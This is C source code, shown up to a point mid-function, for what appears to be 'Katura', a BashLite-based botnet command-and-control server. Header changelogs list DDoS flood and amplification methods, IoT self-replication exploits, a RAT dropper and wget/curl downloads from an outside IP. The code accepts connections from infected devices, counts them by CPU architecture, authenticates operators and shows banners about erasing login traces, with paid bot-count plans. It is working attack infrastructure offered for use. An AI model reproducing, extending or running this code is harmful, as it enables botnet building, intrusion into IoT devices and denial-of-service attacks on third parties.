/*
Katura I, Priv8, C2 Base.
   ----------

   Katura I, A project founded by Transmissional. Made possible by Jack. This was
    A project that I initially abandoned until I decided to recreate it into a server side.
      This project will not be introduced to the public till me & Jack have got completely fed up of using it.

                                                            ~ Zach, Transmissional.
                _________________________________________________________________________________________________________

ChangeLogs || Added By FlexingOnLamers/Jack
Date [11/28/18]

Created C2 Base || WhiteListLog || BlackListLog || Process Terminator || Rat Dropper || Payload Exectuion
Added: AddUser/KickUser Function || Added UserAccounts || Added Alternative Chatroom Source || Added Functional Arch Detector
Added: Functional Subdomain scanner || Added Portscanner || Added AdminPanel Finder
Added: Selfreps And Alternative Includes ["rkn", "hnap", "gpon", "katura", "wmss", "gpon", "kru", "deb", "cat", "huawei", "realtek"]
Added: Functional Logs, Includes ["IP", "Whitelist", "blacklist", "Error", "load", "geo", "SubDomain", "Date", "user", "LogOut", "Shell", "Arch"]
Added: UserID(s) ||  MD5Format For User Information
Added: IP Header Modifcation Extensions, Includes ["LDAP", "MSSQL", "TCP-CRI", "PROWIN", "YUBINA", "SENTINEL", "SSDP", "TS3", "Katura"] || Adding More!
_____________________

ChangeLog || Added By Transmissional/Zach

Date [12/1/18]

Added ASCII (Using RGB Hex, Custom ANSI) || Edited Jack's Information Banners || Edited Arch Functions, TO Subside Coherent Headers
Added Color Organisation || Added Comments For Functions || Added Private Data Sets || Added Modified Payload || Removed Resolve Function Temporarily
Added Color For Client Ouput || Added Raw Color Code Instead Of Variable Ouput || Modified Buffer Off-Sets || Added Dynamic Presetting || 
Convereted Lower Case 'k' to Upper Case 'K' || Edited Jack's Horrible Grammar || Changed Failed Login Output || Changed Title || Changed First Line Of Main Banner
Fixed Responsive Client Ouput || Created New Hexadecimal String For UDP Output ||
_____________________

Notes For Katura I. ( READ THIS JACK )

Problems I Have Came Across Is The Undefined Reference For 'Resolve' Error While Trying To Compile.
To Resolve This, I Have Commented Out Line 753. Please Have A Look.
Define The Function & It Should Be Fixed.
_____________________

Fixed Resolver ( Must Have File )
Compile-Errors due to files not being on server ( You should know this zach )
Since File Was Included, it must be on the server, ive printed a link below to the file, you can just wget or curl it
curl: curl 'http://158.69.204.184/Traffic/resolver.h' >> resolver.h
wget: wget -q http://158.69.204.184/Traffic/resolver.h -O resolver.h
link: http://158.69.204.184/Traffic/resolver.h
Also! File is a Domain-Resolver, not an IP Geo-Location Script (':
______________________

Color Editing.

ctrl + h
replace \x1b[38;5;196m To Color Brackets. ( The Less Bright Color )
replace \x1b[38;5;50m To Color Important Words ( Word's Inside The Brackets And Bright Color )
_____________________
ChangeLogs || Added By FlexingOnLamers/Jack
Date [12/2/18]

Managed Bot/Client
Added New Layer4 UDP Methods Including ["STOMP", "HOME", "RAID"]
Added New Layer4 TCP Methods Including ["TCP-CRI", "TCP-ZACH"]
Added: Arch Detector via ["x86_64", "x86_32", "Arm4", "Arm5", "Arm6", "Arm7", "Mips", "Mipsel", "Sh4", "Ppc", "spc", "M68k", "Arc"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse"]
Added: DevType via ["Python", "python3", "perl"]
Added: Port Detector that dignifies Device Type via ["telnet", "ssh"] etc

Managed C2/CnC
Added: Logging via ["Katura_IP.log", "Katura_Error.log", "Katura_Shell.log", "Katura_Logout.log", "Katura_CNC.log"] 
// We are logging user commands, IPs, errors, shell attempts, and User Log-Outs
Added: Layer4 Section For IP Header Modification Extensions Via ["LDAP", "NTP", "SSDP", "DNS", "REAPER", "MSSQL", "PORTMAP", "TS3", "SENTINEL"]
Added: Layer7 Section For IP Header Modification extensions via ["HAVEN", "JOOMLA", "JOOMLAV2", "CF_BYPASS", "RUDY", "SLOW", "XMLRPC", "GHP"]
Added: Edits to (HELP) Including ["EXTRA", "BOTS"]
Added: Reflection-List Reader/Displayer For ["LDAP", "NTP", "SSDP", "DNS", "REAPER", "MSSQL", "PORTMAP", "TS3", "SENTINEL"] Within (BOTS) // Must finish this! leaving it to you zach
Fixed Small error zach made with Agent-Connections via screen || ( [Katura] Incoming Connection From [0.0.0.0] ) Brackets = \x1b[38;5;196m || IP = \x1b[38;5;50m
Color Codes were only Inputed for the Katura_IP.log || Now being inputted for the connection handler via screen
_____________________

Things that need to get done!

Subdomain Scanner || Must convert from PYTHON to C || Links Below
Curl: curl 'http://158.69.204.184/subdomain_scanner_updated.py' >> sub.py
Wget: wget -q http://158.69.204.184/subdomain_scanner_updated.py -O sub.py
Link: http://158.69.204.184/subdomain_scanner_updated.py
subdomains = ["dc", "test", "api", "old", "ns2", "play", "server", "server1", "server2", "gateway", "app", "media", "help", "embed", "status", "ns1", "host", "dashboard", "blog", "autodiscovery", "beta", "dev", "wiki", "autoconfig", "secure", "irc", "irix", "fileserver", "backup", "agent", "c2c", "ts3", "login", "mssql", "mysql", "localhost", "nameserver", "netstats", "mobile", "mobil",  "ftp", "webadmin", "uploads", "transfer", "tmp", "support", "smtp0#", "smtp#", "smtp", "sms", "shopping", "sandbox", "proxy", "manager", "cpanel", "webmail", "forum", "driect- connect", "vb", "forums", "pop#", "pop", "home", "direct", "mail", "access", "admin", "oracle", "monitor", "administrator", "email", "downloads", "ssh", "webmin", "paralel", "parallels", "www0", "www", "www1", "www2", "www3", "www4", "www5", "autoconfig.admin", "autoconfig", "autodiscover.admin", "autodiscover", "sip", "msoid", "lyncdiscover", "direct-connect", "private", "anycast", "panel", "imap", "portal", "record", "ssl","dns", "m", "client", "i", "x", "cdn", "images", "my", "java", "swf", "ns3", "ns4", "ns5", "mx", "server3", "vpn", "store", "zabbix", "cacti", "search", "nagios", "munin", "data", "stat", "stats", "preview", "phpmyadmin", "server1", "db", "demo", "gateway1", "gateway2", "remote", "svn", "git", "jira", "confluence", "jobs", "reader", "ovhprivate", "release"]
-------------------------
Must Fix Input For IP Header Modifications || If this can-not be done we will convert to using the bot for sending Spoofed-Based Attacks!

IP GeoLocation || Must read UserInput For host, then print IP, HOSTNAME, CITY, REGION, COUNTRY, LOC, POSTAL, ORG || This may be do-able using IPINFO.IO/ (curl ipinfo.io/$IP)

Must add extensions for all layer7 spoofed based methods, im not entirely sure how to use all of them so i dont know what comes after the ./$file || find the ouput and add it to l7spoof

Add the following from Messiah C2 Source
[User plan types]
[remove user]
[kick user]
[ban user]
[user IDs]
[broadcast message]
[maxbots with userplans]
_____________________
ChangeLogs || Added By Transmissional/Zach
Date [12/3/18]

Finished: Attack Methods For Jack
Added: Attack Method Output ( EX: sending flood)
Fixed: ASCII Output On Admin Screen
Added: New presets for new katura custom attack, amplification base factor for [ -0xff 0xfa 0xhz]
Added : New decimal outsets for effective-power (private edition)
Fixed : Jack's grammar on new display menu ( spoofing menu)
New Methods Added : || MEMCACHE || KATURA || RIP || TFTP || SNMP || DB2 || EFCT-PWR || NAT-PMP
Char'd and Printed.
Fixed: Banner Color, ( Took the green out)
Added: New reflectors in device outputs.



*/
// Base Includes all "needed" includes are in /root/C2/headers/includes.h
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>
// #include "includes.h"
// #include "subdomain.h"
#include "resolver.h"           								// Resolver Requires resolver.h file (ITS IN THE INCLUDES ZACH, PLEASE THINK NEXT TIME)  Heres a link to the resolver.h file (must be in root directory)
// #include "C2/headers/reps/realtek.h"										Resolver.h link = http://158.69.204.184/Traffic/resolver.h
// #include "C2/headers/reps/huawei.h"                                                                  This is gonna be great. 
// #include "C2/headers/reps/hnap.h"                                                                                      ~ Zach.
// #include "C2/headers/reps/rkn.h"                                       This is honestly going to be amazing.
// #include "C2/headers/reps/cat.h"                                                                           ~jack
// #include "C2/headers/reps/kru.h"
// #include "C2/headers/reps/wmss.h"
// #include "C2/headers/reps/gpon.h"

#define MAXFDS 1000000
#define c2 "Katura"
#define project "Katura C2"
#define Project_name "Katura C2/BashLite Source"
#define OS_Option "CentOS 6.9 - CentOS 7"
#define version "Beta"
#define developer "FlexingOnLamers/Transmissional"
#define CreationDate "11/28/18"

// we are making inputs for light color codes
#define lwhite "\x1b[1;37m"     // color define
#define lred "\x1b[1;31m"     // color define
#define lgreen "\x1b[1;32m"     // color define
#define lyellow "\x1b[1;33m"     // color define
#define lblue "\x1b[1;34m"     // color define
#define lpurple "\x1b[38;5;196m"     // color define
#define lcyan "\x1b[1;36m"     // color define
// We are making inputs for Dark Color Codes!
#define dwhite "\x1b[0;37m"     // color define
#define dred "\x1b[0;31m"     // color define
#define dgreen "\x1b[0;32m"     // color define
#define dyellow "\x1b[0;33m"     // color define
#define dblue "\x1b[0;34m"     // color define
#define dpurple "\x1b[0;35m"     // color define
#define dcyan "\x1b[0;36m"     // color define
#define dgrey "\e[90m"
// we are making inputs for alternative colors!
#define pink "\e[1;35m"
// we are making inputs for zach's custom 8-bit colors
#define orng "\x1b[38;5;50m"

char *plans[] = 
{
    "free", // Access To 0 Devices + tools
    "beginner", // 100 bot count
    "silver", // 1000 bot count
    "bronze", // 3000 bot count
    "gold", // 6000 Bot count
    "reseller" // 10000 bot count
    "Katura" // all bot count STILL WORK IN PROGRESS
};

struct account 
{
  char username[200]; // username
  char password[200]; // password
  char access [200]; // admin / basic user 
  // char plan[200]; || user plans (defining max bot count for users and restrictions) 
};
static struct account accounts[50];

struct clientdata_t {
  uint32_t ip;
    char x86; 
    char mips;
    char arm;
    char spc;               // char each device exploit
    char ppc;
    char sh4;
  char connected;
} clients[MAXFDS];

struct telnetdata_t {
  uint32_t ip;
  int connected;             // telnet data
} managements[MAXFDS];

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;           // manages connected
static volatile int DUPESDELETED = 0;       // dupes data

int fdgets(unsigned char *buffer, int bufferSize, int fd) // state buffer size 
{
  int total = 0, got = 1;
  while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
  return got;
}
void trim(char *str)
{
  int i;
  int begin = 0;
  int end = strlen(str) - 1;
  while (isspace(str[begin])) begin++;
  while ((end >= begin) && isspace(str[end])) end--;
  for (i = begin; i <= end; i++) str[i - begin] = str[i];
  str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd)  // stop socket from blocking towards host ( screen )
{
  int flags, s;
  flags = fcntl(sfd, F_GETFL, 0);
  if (flags == -1)
  {
    perror("fcntl"); // error output
    return -1;
  }
  flags |= O_NONBLOCK;
  s = fcntl(sfd, F_SETFL, flags);
  if (s == -1)
  {
    perror("fcntl"); // error output
    return -1;
  }
  return 0;
}


static int create_and_bind(char *port) // binding screen port in order for server side to be displayed
{
  struct addrinfo hints;
  struct addrinfo *result, *rp;
  int s, sfd;
  memset(&hints, 0, sizeof(struct addrinfo));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags = AI_PASSIVE;
  s = getaddrinfo(NULL, port, &hints, &result);
  if (s != 0)
  {
    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s)); // GET adress, substitute in error dependent on variable values
    return -1;
  }
  for (rp = result; rp != NULL; rp = rp->ai_next)
  {
    sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
    if (sfd == -1) continue;
    int yes = 1;
    if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt"); // re-use first address, 'setsockopt'
    s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
    if (s == 0)
    {
      break;
    }
    close(sfd);
  }
  if (rp == NULL)
  {
    fprintf(stderr, "Could not bind\n"); // couldn't bind from last screen, 'using last port probably'
    return -1;
  }
  freeaddrinfo(result);
  return sfd;
}
void broadcast(char *msg, int us, char *sender) // broadcast msg output from user
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);                     
        time_t rawtime;                          // find time, struct 'char'd'
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);     // send data from  'sender'
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *epollEventLoop(void *useless)
{
  struct epoll_event event;
  struct epoll_event *events;
  int s;
  events = calloc(MAXFDS, sizeof event);
  while (1)
  {
    int n, i;
    n = epoll_wait(epollFD, events, MAXFDS, -1);
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        clients[events[i].data.fd].connected = 0;    // DEVICES, 'data', 
        clients[events[i].data.fd].arm = 0;
        clients[events[i].data.fd].mips = 0;
        clients[events[i].data.fd].x86 = 0;            // we want to recognize what we have
        clients[events[i].data.fd].spc = 0;
        clients[events[i].data.fd].ppc = 0;
        clients[events[i].data.fd].sh4 = 0;
        close(events[i].data.fd);
        continue;
      }
      else if (listenFD == events[i].data.fd)
      {
        while (1)
        {
          struct sockaddr in_addr;
          socklen_t in_len;
          int infd, ipIndex;

          in_len = sizeof in_addr;
          infd = accept(listenFD, &in_addr, &in_len);
          if (infd == -1)
          {
            if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
            else
            {
              perror("accept");
              break;
            }
          }

          clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr; // client info

          int dup = 0;
          for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
          {
            if (!clients[ipIndex].connected || ipIndex == infd) continue;

            if (clients[ipIndex].ip == clients[infd].ip)
            {
              dup = 1;
              break;
            }
          }

          if (dup)
          {
            DUPESDELETED++;
            continue;
          }

          s = make_socket_non_blocking(infd);                      // don't block my opened socket please 
          if (s == -1) { close(infd); break; }

          event.data.fd = infd;
          event.events = EPOLLIN | EPOLLET;
          s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
          if (s == -1)
          {
            perror("epoll_ctl");
            close(infd);
            break;
          }

          clients[infd].connected = 1;
          send(infd, "~ SC ON\n", 9, MSG_NOSIGNAL);

        }
        continue;
      }
      else
      {
        int thefd = events[i].data.fd;
        struct clientdata_t *client = &(clients[thefd]);
        int done = 0;
        client->connected = 1;
        client->arm = 0;
        client->mips = 0;               // DEVICES
        client->sh4 = 0;
        client->x86 = 0;
        client->spc = 0;
        client->ppc = 0;
        while (1)
        {
          ssize_t count;
          char buf[2048];
          memset(buf, 0, sizeof buf);

          while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0) // ZACH'S COLORS, \x1b[38;5;50m \x1b[38;5;196m
          {
            if (strstr(buf, "\n") == NULL) { done = 1; break; }
            trim(buf);
            if (strcmp(buf, "PING") == 0) {
              if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
              continue;                                                                               // COLORED DEEP RED AND BRIGHT CYAN.
            }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mx86_64\x1b[38;5;196m]") == buf)           // loading the build's for each device, thanks jack
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mx86_32\x1b[38;5;196m]") == buf)
                        {
                          client->x86 = 1;
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mMIPS\x1b[38;5;196m]") == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mMPSL\x1b[38;5;196m]") == buf)
                        {
                          client->mips = 1; 
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mARM4\x1b[38;5;196m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mARM5\x1b[38;5;196m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mARM6\x1b[38;5;196m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mARM7\x1b[38;5;196m]") == buf)
                        {
                          client->arm = 1; 
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mPPC\x1b[38;5;196m]") == buf)
                        {
                          client->ppc = 1;
                        }
                        if(strstr(buf, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50mDevices \x1b[38;5;196mLoading [\x1b[38;5;50mBuild\x1b[38;5;196m] \x1b[38;5;50m~> \x1b[38;5;196m[\x1b[38;5;50mSPC\x1b[38;5;196m]") == buf)
                        {
                          client->spc = 1;
                        }
                                                if(strcmp(buf, "PING") == 0) {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                continue; }
                                                if(strcmp(buf, "PONG") == 0) {
                                                continue; }
                                                printf("\"%s\"\n", buf); }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        client->arm = 0;
                                        client->mips = 0;
                                        client->sh4 = 0;
                                        client->x86 = 0;           // DEVICES
                                        client->spc = 0;
                                        client->ppc = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}

unsigned int armConnected()                  // ARM CONNECTED
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].arm) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()                 // MIPSEL CONNECTED
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}

unsigned int x86Connected()                  // ARCH X86 CONNECTED
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}

unsigned int spcConnected()                  // SPC CONNECTED
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
} 

unsigned int ppcConnected()                  // PPC CONNECTED
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}

unsigned int sh4Connected()                  // SH4 CONNECTED
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].sh4) continue;
                total++;
        }
 
        return total;
}

unsigned int clientsConnected()              // CLIENTS CONNECTED            
{
  int i = 0, total = 0;
  for (i = 0; i < MAXFDS; i++)
  {
    if (!clients[i].connected) continue;
    total++;
  }

  return total;
}

    void *titleWriter(void *sock)                 // title, edited a little bit by Zach.
    {
        int thefd = (long int)sock;
        char string[2048];
        while(1)
        {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; Katura I | IoT Devices: %d | Operators: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
            sleep(2);
        }
    }


int Search_in_File(char *str)
{
  FILE *fp;
  int line_num = 0;
  int find_result = 0, find_line = 0;
  char temp[512];

  if ((fp = fopen("katura.txt", "r")) == NULL) {        // login.txt
    return(-1);
  }
  while (fgets(temp, 512, fp) != NULL) {
    if ((strstr(temp, str)) != NULL) {
      find_result++;
      find_line = line_num;
    }
    line_num++;
  }
  if (fp)
    fclose(fp);

  if (find_result == 0)return 0;

  return find_line;
}
void client_addr(struct sockaddr_in addr) {                // client ip logger
  printf("\x1b[38;5;196m[\x1b[38;5;50m%d.%d.%d.%d\x1b[38;5;196m]\n",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  FILE *logFile;
  logFile = fopen("katura_IP.log", "a");
  fprintf(logFile, "\n\x1b[38;5;196mIP:\x1b[38;5;196m[\x1b[38;5;50m%d.%d.%d.%d\x1b[38;5;196m]",
    addr.sin_addr.s_addr & 0xFF,
    (addr.sin_addr.s_addr & 0xFF00) >> 8,
    (addr.sin_addr.s_addr & 0xFF0000) >> 16,
    (addr.sin_addr.s_addr & 0xFF000000) >> 24);
  fclose(logFile);
}

void *telnetWorker(void *sock) {    // telnet worker
  int thefd = (int)sock;
  managesConnected++;
  int find_line;
  pthread_t title;
  char counter[2048];
  memset(counter, 0, 2048);
  char buf[2048];
  char* nickstring;
  char usernamez[80];
  char* password;
  char *admin = "admin"; 
  memset(buf, 0, sizeof buf);
  char katura[2048];
  memset(katura, 0, 2048);

  FILE *fp;
  int i = 0;              // open katura.txt to find user
  int c;
  fp = fopen("katura.txt", "r"); // format: user pass id (id is only need if admin user ex: user pass admin)
  while (!feof(fp))
  {
    c = fgetc(fp);
    ++i;
  }
  int j = 0;
  rewind(fp);
  while (j != i - 1)
  {
        fscanf(fp, "%s %s %s", accounts[j].username, accounts[j].password, accounts[j].access); // finding accounts
    ++j;
  }
   sprintf(katura, "Username:");  // ask username input
  if (send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
  if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
  trim(buf);
  sprintf(usernamez, buf);
  nickstring = ("%s", buf);
  find_line = Search_in_File(nickstring);

  if (strcmp(nickstring, accounts[find_line].username) == 0) {
    sprintf(katura, "Password:"); // ask password input
    if (send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, thefd) < 1) goto end;
    trim(buf);
    if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
    goto katura;
  }
    failed:
        pthread_create(&title, NULL, &titleWriter, sock);
        char failed_line1[5000];     // char each line
        char failed_line2[5000];     // char each line

        char clearscreen [5000];     // char each line
        memset(clearscreen, 0, 2048);
        sprintf(clearscreen, "\033[2J\033[1;1H");

        sprintf(failed_line1, "Credentials Error !\r\n");  // We are Attempting To Display FailedBanner! ( edited by zach)
        sprintf(failed_line2, "You Do NOT Have Authorized Access To This System.\r\n");  // We are Attempting To Display FailedBanner! ( edited by zach)


        sleep(1); // You Have Failed!
        if(send(thefd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end; // You Have Failed!
        sleep(3);
        goto end; // You Have Failed!
        if (send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        katura: // We are Displaying Attempting to display main banner!
        pthread_create(&title, NULL, &titleWriter, sock); // We are Displaying Attempting to display main banner!
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end; // We are Displaying Attempting to display main banner!
        char start_1 [500];     // char each line
        char start_2 [500];     // char each line
        char start_3 [500];     // char each line
        char start_4 [500];     // char each line
        char start_5 [500];     // char each line
        char start_6 [500];     // char each line
        char start_7 [500];     // char each line
        char start_8 [500];     // char each line
        char start_9 [500];     // char each line     
        char start_10 [500];     // char each line
        char start_11 [500];     // char each line
        char katura_1 [5000];               // zachs colors \x1b[38;5;50m 
        char katura_2 [5000];     // char each line
        char katura_3 [5000];                          // \x1b[38;5;196m
        char katura_4 [5000];     // char each line
        char katura_5 [5000];      // char each line                                                 // EDITED COLOURS, HIGHLIGHTED FUNCTIONS WITH CUSTOM CYAN

        sprintf(start_1, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mLoading \x1b[38;5;50mKatura C2 \x1b[38;5;196mSession.. \r\n");
        sprintf(start_2, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;50mKatura C2 \x1b[38;5;196mSession Loaded! \r\n");
        // clear
        sprintf(start_3, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mRemoving All \x1b[38;5;50mTraces \x1b[38;5;196mOf \x1b[38;5;50mLD_Preload..\r\n");
        sprintf(start_4, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mFinished Removing ALL \x1b[38;5;50mTraces \x1b[38;5;196mOf \x1b[38;5;50mLD_Preload!\r\n");
        // clear
        sprintf(start_5, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mMasking \x1b[38;5;50mConnection From \x1b[38;5;50mutmp+wtmp...\r\n");
        sprintf(start_6, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;50mSucessfully Masked Connection! \r\n");
        // clear
        sprintf(start_7, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mMarking All \x1b[38;5;50mIP Header Modification Extension...\r\n");
        sprintf(start_8, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mFinished Marking \x1b[38;5;50mIPHM Extensions!\r\n");
        // clear
        sprintf(start_9, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;196mLogging \x1b[38;5;50mUser Information..\r\n");
        sprintf(start_10, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;50mUser Information \x1b[38;5;196mSuccessfully \x1b[38;5;50mLogged!\r\n");
        sprintf(start_11, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] \x1b[38;5;50m| \x1b[38;5;50mWelcome \x1b[38;5;196m[ \x1b[38;5;50m%s \x1b[38;5;196m] \r\n", accounts[find_line].username, buf);
        // clear
		    sprintf(katura_1, "\x1b[38;5;50mKatura \x1b[38;5;196mI, \x1b[38;5;196m[\x1b[38;5;50mPrivate Source\x1b[38;5;196m]\r\n");
		    sprintf(katura_2, "\x1b[38;5;196mProject: \x1b[38;5;50mKatura C2\r\n");
		    sprintf(katura_3, "\x1b[38;5;196mVersion: \x1b[38;5;50mBeta\r\n");
        sprintf(katura_4, "\x1b[38;5;196mOS_Option(s): \x1b[38;5;50mCentOS \x1b[38;5;196m6.9 \x1b[38;5;50m- CentOS \x1b[38;5;196m7\r\n");
        sprintf(katura_5, "\x1b[38;5;196mDevelopers: \x1b[38;5;50mFlexingOnLamers \x1b[38;5;196m& \x1b[38;5;50mTransmissional.\r\n");

        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, start_1, strlen(start_1), MSG_NOSIGNAL) == -1) goto end;
        sleep (2); 
